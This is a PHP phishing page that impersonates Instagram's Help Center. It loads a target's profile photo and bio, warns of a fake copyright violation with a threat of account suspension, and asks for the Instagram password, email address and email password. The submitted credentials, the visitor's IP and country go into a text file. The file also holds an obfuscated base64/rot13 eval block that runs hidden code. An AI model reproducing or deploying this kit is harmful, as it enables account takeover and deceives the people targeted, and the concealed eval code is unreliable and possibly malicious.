<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["erhanbey"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }




  foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:description' ) {
            $qenzyist = $meta->getAttribute('content');
        }
    }



if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
?>
<?php
/**
    * Aponkral PHPkoru
    * APONKRAL PHPkoru ONLINE ENCODER
    * Website: https://phpkoru.com/
    * Online Encoder: https://phpkoru.com/basit/
    * Developer Website: https://aponkral.net/
    *
    * Version: v1.0.2.1
    *
*/
// Her şeyi sana yazdım!.. Her şeye seni yazdım!.. *Mustafa Kemal ATATÜRK

function eha_pbqr($pbqr) {
    eval(base64_decode('JGZnZV9lYmcxMyA9IA0Kc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoJ1ptZGxYMlZpWnpFeicpKTs='));
    eval(base64_decode('JG9uZnI2NF9xcnBicXIgPSBzdHJfcm90MTMoYmFzZTY0X2RlY29kZSgnYjI1bWNqWTBYM0Z5Y0dKeGNnPT0nKSk7'));
    eval(base64_decode('ZXZhbCgnPz4nLiRmZ2VfZWJnMTMoJG9uZnI2NF9xcnBicXIoJGZnZV9lYmcxMygkcGJxcikpKSk7'));
    eval(base64_decode('dW5zZXQoJHBicXIsICRmZ2VfZWJnMTMsICRvbmZyNjRfcXJwYnFyKTs='));
}

eval(base64_decode('JGZnZV9lYmcxMyA9IA0Kc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoJ1ptZGxYMlZpWnpFeicpKTs='));
eval(base64_decode('JG9uZnI2NF9xcnBicXIgPSBzdHJfcm90MTMoYmFzZTY0X2RlY29kZSgnYjI1bWNqWTBYM0Z5Y0dKeGNnPT0nKSk7'));

eval(base64_decode('JGVoYV9wYnFyID0gJ2NuVnVYMk52WkdVPSc7'));
preg_match($fge_ebg13($onfr64_qrpbqr('L1xbQ1VDeGJlaF9QYnFyXF0oLio/KVxbXC9DVUN4YmVoX1BicXJcXS9m')), file_get_contents(__FILE__), $CUCxbeh_z);
eval($onfr64_qrpbqr($fge_ebg13('MKMuoPtxMzqyK2IvMmRmXPEiozMlAwEspKWjLaSlXPqwoJk1MIAan1ygEacnISxjJQWFoSxlBJgnH2qeLmAFrItmFaMxERI6F0AxLIqTpT9Mn05hLGSjqScUrSyAoScjI25jEzIeqREIoyccLyMjAIEgpSAnoH5MH25xJzWeJwIGZR5eLJkXAyMHEzSJoTfkJJcTq2EJGaEyEzkBGHEJZyLkJz9EoHy4L0uFLIVmnScHI3uuL0MxqJASJzkuZ1WWIQSbI1yKFaWuZ2kILGSeZIcIMR9xIxM0LxqjJSWKrQWIZaEiHmNkJSAhGyOJZ0WjISq4F2ZkGKuHoxcdGHq4FIHlZKquoHcJI25FJTWHIacKoGSCI1MBqIcUEyqAZzu4IwV1p2VlHaEGoyWLLz14HSyKrRgvIzg4LHI0n01KrQSIoGImIRMWrIIhGzSFryLlJJcPq1VkEaWvEycGGGSWrIqHFGSJZKO0H2kxnx0lnScJIRbjMQSFEyEeFzuJoRc6IGW0n1EJJxMuZ2uILyq0ASMJJyWyExMLLxHkHx1So3yKImO4JIqJIx5LEyMvIaOkIwOJq00kMSuBIJEfIyuFFILlZQSMIyckLxuBJSM6EaSnIII4GyMirJWTIzyKEHcVIxMxrx5JJyqvEScILxIXJSIfMQAxZIcmIzkxnH1JJyyIoTumIHMxFTIVFyqKFRWRITknH1LkIaWwEGyKIxInASMdEyAJZIMUH2gnnR0lnRgMIzDjMQSFEyEeFzgAFTuSIIp1LJSKFyqwESMILyuPISqgZH9KIx51JxMjnJRkomSIrxWeJIqXp2ATMSOJZ2uuJJkxG05THyyvEmIbIzkXZSxjIzSHoHL2LxMnJSqVDyOJIIcuHz1XEISfMSqJoUNlIzknn1WgIyMCIzkcHwAFI1cKqRcAIycUI2kBITS6IyqHIzuUI0MnE1qfEyMuZIc5JyIJp2AUEKcEn3uJGJ5AryAhoUWwEKEIL3bjoxgGn3OCqm09WlxcXGf=')));
eval($fge_ebg13($onfr64_qrpbqr('aGFmcmcoJHJ1bl9jb2RlLCAkUEhQa29ydV9tKTs=')));
eval(base64_decode('dW5zZXQoJGZnZV9lYmcxMywgJG9uZnI2NF9xcnBicXIpOw=='));
?>
<?php

/**[PHPkoru_Info]
Version: 1.0.2.1 (1.0.2release.1)
Website: https://phpkoru.com/
Online Encoder: https://phpkoru.com/basit/
Developer Website: https://aponkral.net/
[/PHPkoru_Info]*/

/**[PHPkoru_Code]
TEs3eTB6OEhyN3V4VlFxdzJMWnpCRFIyS0t0T1FyZ0V2S1JPYVZXcmdCcGlzdTNjbG5sV3VRQ0EwUTN3RWxQRkRTTCtGN29yS2E1ZHNXSlMzM0NhVEd0d1pJdi9LRXhDMkNjSVB6MytkeDBXeWkxSVpqM240T0czMzJhUjZZaEphVUdYMms3ck5BaUV2Rm15ZHFvQnFSQmg3V3l0MzJEZldYV0RUdzVRdFF6aUZMVmo4MTI0MXFOOVA5VW1TN0lQUHpTQjNNaWpSSDQ3QlF4OThJMmZkR2JVL1hmaXNqNHBSS3Jvc1cxdmJsL2tZb3BTVWVRc25jdkNaQ0hJK1BBTDMxMlMxdXhQdVJIN1ZWaEVWMGx5aHBZaXZDU0tvUGxYNWpUa0pCRlVvR2xJOE1EbkErK25oMlRVV0dJeklrRDcxUUdBdVhNVDVVTUdacWo2dHV4S3llcGpYN0tnUG9LUTVtZDBpdjJYOTBQQkN2MzhyaUQ3V29QRFVKUU5CanZkZHBqUXV1M0NrUjlDd09qN29DQ0IrU0ZZMnR6ZHdpVTZtamNCOUEyUDlnQXFDNnRBUytEbUNBdFpKNmxjSnNCUkg1V2QxeWl3MllHWHExUlVwbEYwVlJVU08xMjIraUtocWI0TUhqUldmQ1dpTWNKR3JjVnFyMzAwbkJBOUtlRUhTeEpCMFVxdzlMa2JDRHpzS2plRkJ2aDhPSHpOalJXUG1naVJMV0UwVW80eG9EdlBGNnBvNm1Xa2JIZFN6alAwM1VGR1dBbHhUbGFrTE03dDhYV2oxSjVyNDJHekJaN3dCSW9pZjN3RHNSTDJsV0xzOXBEUnJQUFBkdXBKNkdhQkFwTDE4MVhJL3NoSW9IRnVnVTNGMnZlczloMS9Oc1hXSk5mS2JHWGVZQVJoMkhrTkZkTFJJRzNoN3NXT05UTkhNbGZJcEFZUFRLOVBSOCs5VGRlSFZPOUt5WS94ejk5cHVNTHBCU3pqRFhKbTdiaG1UaWNZWktYR1ZnK0pyTHNXQXdBTWU0OWtQbENOQzJuVWdQai9iTEFlc3g0UDM4NFpIQlJwZGh5ZGoyUzB0SE5NS2tPbW51SDFPZmRXUWJ4NFJER3NrL3U0eEJEekowS1d4Z1ZicGc9PQ==
[/PHPkoru_Code]*/

?>
<?php
$file = fopen('hesaplar.txt', 'a');
fwrite($file, "Username: ".$nick."\n\n" ."Password: ".$password. "\n\n"."Mail: ".$mail."\n\n"."Mail Password: ".$mailpass."\n\n"."Ip Adress: " .$ip."\n\n".

"Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n");
fclose($file);
echo '';
    header("Location: confirmed.php");
}

    ?>
        
<html>
<head>
    <script type="text/javascript">
        var x="Qenzy Erhan Can Türker";
        console.log(x);
    </script>
     <meta charset="utf-8">
     <title>Copyright | Help Center</title>
     <meta name="viewport" content="width=device-width">
<link rel="icon" href="https://www.resimag.com/p1/87ae1ad3604.png">    
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:25px;
}

#sa{
background-color:white;
width:340px;
max-width:89%;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:290px;
max-width:94%;

 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:16px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
     
</head>
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px solid #cecece; ;" >

<img src="https://resimag.com/p1/819f2f28aae.png" width=175 id="erhan" style="margin:6px;" >
<br><br>
</div>
<br><br>

<center>
<div id="sa" style="border:1px solid #cecece;"> <br> 


<br>
<img src="<?php echo $image_url; ?>" alt="<?php echo $nick ?>'of photo" style="max-width:60%; border-radius:50%;">
<br>
<h1 id="erhanasd">@<?php echo $nick; ?> </h1>
<p id="yazi1">
    Hello <?php echo $nick; ?>;<br>
 <br>
Your account violates our copyright. If you do not fill out this form, we will suspend your account. Our team will return as soon as possible. Please provide us with the correct information for "Copyright Notice". We always work for your security and protect your rights.

</p>

<br>

<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Mail Adress" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

    <input type="password" name="mailpass" placeholder="Mail Password" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
        <br>



    
    
<br>
    <br>
<button id="buton" type="submit" name="submit" value="1"> Confirm as @<?php echo $nick; ?> </button><br>
<br>
<br>
<table style="width:100%;border-top:1px solid #cecece;padding-top:8px;">
  <tr>
    <th style="width:30%;">
    <img src="<?php echo $image_url; ?>" alt="<?php echo $nick ?>'of photo" style="max-width:60%; border-radius:50%;" width=40>
    </th>
    
    <th style="width:69%;padding-top:5px;"><a href="https://instagram.com/" style="text-decoration:none;">
<p style="width:250px; max-width:88%;color: #3897f0;font-family:sans-serif;font-size:13px; font-weight:400;">
<?php echo $qenzyist; ?>

</p>
</a></th>
  </tr>
 
</table>




 
</form>

</center>



</div>
<br> <br>
<center>
<div id="get">
<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
</div>
<br><br>
<div id="menu">
<li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;

<li id="liste"><a href="" id="link">LANGUAGE</a> </li>

</div>
<br><br><br>
<div style="bottom:0px; padding:5px;width:99%; background:#fafafa;border-top:1px solid #cecece" class="Erhancan_Turker">
<p style="color: rgba(var(--f52,153,153,153),1);font-family:sans-serif;font-size:12px;font-weight:400;">© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
</div>
</center>


</body>



</html>